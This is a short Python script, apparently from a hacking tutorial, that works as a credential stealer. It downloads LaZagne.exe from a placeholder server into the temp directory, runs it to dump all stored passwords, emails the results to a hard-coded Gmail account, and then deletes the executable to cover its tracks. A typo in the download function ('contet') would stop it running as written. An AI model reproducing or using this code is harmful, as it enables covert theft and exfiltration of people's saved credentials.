#!/usr/bin/env python

import requests
import subprocess, smtplib, os, tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.contet)
    

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()
    

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://IPADDRESS/LOCATION/LaZagne.exe")
result = subprocess.check_output("LaZagne.exe all", shell=True)
send_mail("EMAIL", "PASSWORD", result)
os.remove("LaZagne.exe")
